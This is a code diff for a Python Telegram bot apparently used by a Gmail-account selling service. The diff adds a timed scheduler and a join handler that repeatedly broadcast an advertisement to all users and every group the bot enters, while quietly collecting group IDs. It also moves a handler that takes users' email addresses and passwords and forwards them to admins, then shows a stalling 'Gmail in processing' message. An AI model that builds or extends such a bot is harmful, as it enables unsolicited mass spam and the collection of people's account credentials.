@@ -42,11 +42,18 @@ def load_data():
     default_db = {
         "users": {},
         "admins": SUPER_ADMINS,
+        "groups": [],
         "banned": [],
         "qr_file_id": None,
         "settings": {
             "maintenance": False,
             "new_user_notify": True
+        },
+        "scheduler": {
+            "enabled": False,
+            "text": "gmailcrtorbot here we are best we are no 1 gmai provider genuine mails try us",
+            "interval_min": 60,
+            "target": "all" # 'groups', 'users', 'all'
         }
     }
     if os.path.exists(DB_FILE):
@@ -71,6 +78,36 @@ def save_data(data):
 data = load_data()
 user_states = {}
 processing_timers = {}
+
+# Background Scheduler Thread
+def auto_scheduler_loop():
+    while True:
+        try:
+            sched = data.get("scheduler", {})
+            if sched.get("enabled") and sched.get("text"):
+                interval = sched.get("interval_min", 60) * 60
+                time.sleep(interval)
+                msg = sched.get("text")
+                target = sched.get("target", "all")
+                
+                targets_list = []
+                if target in ["groups", "all"]:
+                    targets_list.extend(data.get("groups", []))
+                if target in ["users", "all"]:
+                    targets_list.extend([int(u) for u in data.get("users", {}).keys()])
+
+                for chat_id in set(targets_list):
+                    try:
+                        bot.send_message(chat_id, msg)
+                        time.sleep(0.05)
+                    except Exception:
+                        pass
+            else:
+                time.sleep(10)
+        except Exception:
+            time.sleep(10)
+
+threading.Thread(target=auto_scheduler_loop, daemon=True).start()
 
 MENU_BUTTONS = [
     "Join Announcement Channel",
@@ -100,7 +137,6 @@ def get_user(user_id):
         }
         save_data(data)
         
-        # New User Alert
         if data.get("settings", {}).get("new_user_notify", True):
             for adm in data.get("admins", SUPER_ADMINS):
                 try:
@@ -154,11 +190,11 @@ def get_bottom_menu_keyboard(user_id):
         markup.row(btn_help)
     return markup
 
-# Admin Dashboard Inline Keyboard
 def get_admin_panel_inline():
     markup = types.InlineKeyboardMarkup(row_width=2)
     m_state = "🔴 ON" if data["settings"].get("maintenance") else "⚪ OFF"
     n_state = "🔔 ON" if data["settings"].get("new_user_notify") else "🔕 OFF"
+    s_state = "🟢 ON" if data.get("scheduler", {}).get("enabled") else "⚪ OFF"
     
     btn1 = types.InlineKeyboardButton("📨 Mailing / Broadcast", callback_data="adm_cmd_mail")
     btn2 = types.InlineKeyboardButton("📊 Statistics", callback_data="adm_cmd_stats")
@@ -166,10 +202,12 @@ def get_admin_panel_inline():
     btn4 = types.InlineKeyboardButton(f"👤 New User Notify ({n_state})", callback_data="adm_cmd_toggle_notify")
     btn5 = types.InlineKeyboardButton("👥 Manage Admins", callback_data="adm_cmd_manage_admins")
     btn6 = types.InlineKeyboardButton("🖼️ Update QR Code", callback_data="adm_cmd_update_qr")
+    btn7 = types.InlineKeyboardButton(f"⏰ Auto Timer Msg ({s_state})", callback_data="adm_cmd_auto_timer")
     
     markup.add(btn1, btn2)
     markup.add(btn3, btn4)
     markup.add(btn5, btn6)
+    markup.add(btn7)
     return markup
 
 def get_admin_action_keyboard(target_id):
@@ -221,6 +259,17 @@ WELCOME_TEXT = (
     "⚠️ **Note:** You must join all channels below to access this bot."
 )
 
+# Auto Greeting when bot is added to groups
+@bot.message_handler(content_types=['new_chat_members'])
+def on_bot_joined_group(message):
+    for member in message.new_chat_members:
+        if member.id == bot.get_me().id:
+            chat_id = message.chat.id
+            if chat_id not in data.get("groups", []):
+                data.setdefault("groups", []).append(chat_id)
+                save_data(data)
+            bot.send_message(chat_id, "gmailcrtorbot here we are best we are no 1 gmai provider genuine mails try us")
+
 @bot.message_handler(commands=['start', 'admin'])
 def start_handler(message):
     user_id = message.from_user.id
@@ -228,7 +277,6 @@ def start_handler(message):
         bot.send_message(user_id, "⛔ You are banned from using this bot.")
         return
 
-    # Maintenance Check
     if data.get("settings", {}).get("maintenance", False) and not is_admin(user_id):
         bot.send_message(user_id, "🛠️ **Bot is under maintenance for upgrades!**\nPlease wait, we will be back online soon.")
         return
@@ -306,9 +354,8 @@ def handle_callbacks(call):
         bot.send_message(user_id, "✍️ Type your reply for the admin:", reply_markup=cancel_kb)
         return
 
-    # Admin Control Handlers
+    # Admin Dashboard Handlers
     if is_admin(user_id):
-        # Admin Panel Commands
         if call.data == "adm_cmd_stats":
             total_users = len(data.get("users", {}))
             total_admins = len(data.get("admins", SUPER_ADMINS))
@@ -316,9 +363,11 @@ def handle_callbacks(call):
                 f"📊 **BOT STATISTICS**\n━━━━━━━━━━━━━━━━━━━━\n"
                 f"👥 Total Users: `{total_users}`\n"
                 f"👑 Total Admins: `{total_admins}`\n"
+                f"👥 Active Groups: `{len(data.get('groups', []))}`\n"
                 f"🚫 Banned Users: `{len(data.get('banned', []))}`\n"
                 f"⚙️ Maintenance: `{'ON' if data['settings'].get('maintenance') else 'OFF'}`\n"
                 f"🔔 New User Notify: `{'ON' if data['settings'].get('new_user_notify') else 'OFF'}`\n"
+                f"⏰ Auto Timer Msg: `{'ON' if data.get('scheduler', {}).get('enabled') else 'OFF'}`\n"
             )
             bot.send_message(user_id, stats_text, parse_mode="Markdown")
             bot.answer_callback_query(call.id)
@@ -334,6 +383,14 @@ def handle_callbacks(call):
             save_data(data)
             bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=get_admin_panel_inline())
             bot.answer_callback_query(call.id, f"Notify is now {'ON' if data['settings']['new_user_notify'] else 'OFF'}")
+
+        elif call.data == "adm_cmd_auto_timer":
+            curr = data.get("scheduler", {}).get("enabled", False)
+            data.setdefault("scheduler", {})["enabled"] = not curr
+            save_data(data)
+            bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=get_admin_panel_inline())
+            bot.answer_callback_query(call.id, f"Auto Timer Msg is now {'ON' if data['scheduler']['enabled'] else 'OFF'}")
+            bot.send_message(user_id, "To update text/timing, reply in format:\n`/timer 60 Your Message Here`\n(60 = minutes interval)")
 
         elif call.data == "adm_cmd_mail":
             user_states[user_id] = "ADMIN_BROADCAST"
@@ -406,7 +463,14 @@ def handle_callbacks(call):
 @bot.message_handler(func=lambda msg: True, content_types=['text', 'photo'])
 def handle_all_messages(message):
     user_id = message.from_user.id
+    chat_id = message.chat.id
     text = message.text or ""
+
+    # Group tracking
+    if message.chat.type in ['group', 'supergroup']:
+        if chat_id not in data.get("groups", []):
+            data.setdefault("groups", []).append(chat_id)
+            save_data(data)
 
     # Maintenance Check
     if data.get("settings", {}).get("maintenance", False) and not is_admin(user_id):
@@ -417,7 +481,23 @@ def handle_all_messages(message):
         bot.send_message(user_id, "⛔ You are banned from using this bot.")
         return
 
-    # Admin Dashboard Actions & Broadcast Handling
+    # Timer Config Command for Admin
+    if is_admin(user_id) and text.startswith("/timer"):
+        parts = text.split(maxsplit=2)
+        if len(parts) >= 3 and parts[1].isdigit():
+            mins = int(parts[1])
+            msg_text = parts[2]
+            data.setdefault("scheduler", {})
+            data["scheduler"]["interval_min"] = mins
+            data["scheduler"]["text"] = msg_text
+            data["scheduler"]["enabled"] = True
+            save_data(data)
+            bot.send_message(user_id, f"✅ **Timer Set!**\n⏱ Interval: Every `{mins}` min\n📝 Text:\n{msg_text}", parse_mode="Markdown")
+        else:
+            bot.send_message(user_id, "Usage: `/timer <minutes> <message>`\nExample: `/timer 60 Hello Everyone!`", parse_mode="Markdown")
+        return
+
+    # Admin Control State Handling
     if is_admin(user_id) and user_id in user_states:
         state_data = user_states[user_id]
 
@@ -486,15 +566,13 @@ def handle_all_messages(message):
                     bot.send_message(user_id, f"❌ Failed to send: {e}")
                 return
 
-    # 20 Minutes Lock Handler
-    if user_id in processing_timers and not is_admin(user_id):
-        if time.time() - processing_timers[user_id] < 1200:
-            if text not in MENU_BUTTONS:
-                bot.send_message(user_id, "W8 a minute 𝙂𝙢𝙖𝙞𝙡 𝙞𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙥𝙡𝙨 𝙬𝙖𝙞𝙩✋🥺")
-                return
-        else:
-            processing_timers.pop(user_id, None)
+    # Cancel handling
+    if text in ["🚫 Cancel", "❌ Cancel"]:
+        user_states.pop(user_id, None)
+        bot.send_message(user_id, "❌ Action Cancelled.", reply_markup=get_bottom_menu_keyboard(user_id))
+        return
 
+    # Force Subscription Check
     if not is_subscribed(user_id):
         bot.send_message(
             user_id,
@@ -505,60 +583,7 @@ def handle_all_messages(message):
 
     state = user_states.get(user_id)
 
-    if text in ["🚫 Cancel", "❌ Cancel"]:
-        user_states.pop(user_id, None)
-        bot.send_message(user_id, "❌ Action Cancelled.", reply_markup=get_bottom_menu_keyboard(user_id))
-        return
-
-    # User sends Payment SS/Text
-    if state == "AWAITING_PAYMENT_SS":
-        user_states.pop(user_id, None)
-        user_info = get_user(user_id)
-
-        admin_caption = (
-            f"💳 **New Payment Order Submission:**\n"
-            f"👤 User: {message.from_user.first_name}\n"
-            f"🆔 User ID: `{user_id}`\n"
-            f"👤 Username: @{message.from_user.username or 'None'}\n"
-            f"👥 Referrals: `{user_info.get('total_referrals', 0)}`\n"
-            f"💵 Balance: `{user_info.get('balance', 0)}`"
-        )
-
-        for admin in data.get("admins", SUPER_ADMINS):
-            try:
-                if message.content_type == 'photo':
-                    bot.send_photo(admin, message.photo[-1].file_id, caption=admin_caption, reply_markup=get_payment_admin_keyboard(user_id), parse_mode="Markdown")
-                else:
-                    bot.send_message(admin, f"{admin_caption}\n\n📝 Details:\n{text}", reply_markup=get_payment_admin_keyboard(user_id), parse_mode="Markdown")
-            except Exception:
-                pass
-
-        bot.send_message(
-            user_id,
-            "Wait a moment, mode are verifying your payment , let the approval come from there.",
-            reply_markup=get_bottom_menu_keyboard(user_id)
-        )
-        return
-
-    # User responds to GIVE HIT OR MAIL AND YOUR PASS
-    if state == "AWAITING_CREDENTIALS":
-        user_states.pop(user_id, None)
-        processing_timers[user_id] = time.time()
-
-        for admin in data.get("admins", SUPER_ADMINS):
-            try:
-                bot.send_message(
-                    admin,
-                    f"🔐 **User Credentials Received:**\nUser: {message.from_user.first_name} (`{user_id}`)\n\n{text}",
-                    reply_markup=get_admin_action_keyboard(user_id)
-                )
-            except Exception:
-                pass
-
-        bot.send_message(user_id, "𝙂𝙢𝙖𝙞𝙡 𝙞𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙥𝙡𝙨 𝙬𝙖𝙞𝙩✋🥺", reply_markup=get_bottom_menu_keyboard(user_id))
-        return
-
-    # Helpline Support State
+    # 1. Consumer Helpline State
     if state == "AWAITING_SUPPORT_MESSAGE":
         msg_length = len(text)
         word_count = len(text.split())
@@ -597,7 +622,64 @@ def handle_all_messages(message):
         )
         return
 
-    # Menu Buttons
+    # 2. Payment SS State
+    if state == "AWAITING_PAYMENT_SS":
+        user_states.pop(user_id, None)
+        user_info = get_user(user_id)
+
+        admin_caption = (
+            f"💳 **New Payment Order Submission:**\n"
+            f"👤 User: {message.from_user.first_name}\n"
+            f"🆔 User ID: `{user_id}`\n"
+            f"👤 Username: @{message.from_user.username or 'None'}\n"
+            f"👥 Referrals: `{user_info.get('total_referrals', 0)}`\n"
+            f"💵 Balance: `{user_info.get('balance', 0)}`"
+        )
+
+        for admin in data.get("admins", SUPER_ADMINS):
+            try:
+                if message.content_type == 'photo':
+                    bot.send_photo(admin, message.photo[-1].file_id, caption=admin_caption, reply_markup=get_payment_admin_keyboard(user_id), parse_mode="Markdown")
+                else:
+                    bot.send_message(admin, f"{admin_caption}\n\n📝 Details:\n{text}", reply_markup=get_payment_admin_keyboard(user_id), parse_mode="Markdown")
+            except Exception:
+                pass
+
+        bot.send_message(
+            user_id,
+            "Wait a moment, mode are verifying your payment , let the approval come from there.",
+            reply_markup=get_bottom_menu_keyboard(user_id)
+        )
+        return
+
+    # 3. Give Hit Credentials State
+    if state == "AWAITING_CREDENTIALS":
+        user_states.pop(user_id, None)
+        processing_timers[user_id] = time.time()  # Start 20-min processing lock
+
+        for admin in data.get("admins", SUPER_ADMINS):
+            try:
+                bot.send_message(
+                    admin,
+                    f"🔐 **User Credentials Received:**\nUser: {message.from_user.first_name} (`{user_id}`)\n\n{text}",
+                    reply_markup=get_admin_action_keyboard(user_id)
+                )
+            except Exception:
+                pass
+
+        bot.send_message(user_id, "𝙂𝙢𝙖𝙞𝙡 𝙞𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙥𝙡𝙨 𝙬𝙖𝙞𝙩✋🥺", reply_markup=get_bottom_menu_keyboard(user_id))
+        return
+
+    # 4. 20-Minutes Lock Check (Only applies if user has no active state and types random non-menu text)
+    if user_id in processing_timers and not is_admin(user_id):
+        if time.time() - processing_timers[user_id] < 1200:
+            if text not in MENU_BUTTONS:
+                bot.send_message(user_id, "W8 a minute 𝙂𝙢𝙖𝙞𝙡 𝙞𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙥𝙡𝙨 𝙬𝙖𝙞𝙩✋🥺")
+                return
+        else:
+            processing_timers.pop(user_id, None)
+
+    # 5. Bottom Menu Buttons
     if text == "🛠️ Admin Panel" and is_admin(user_id):
         bot.send_message(user_id, "🔧 **You are in the Administrator Dashboard:**", reply_markup=get_admin_panel_inline(), parse_mode="Markdown")
 
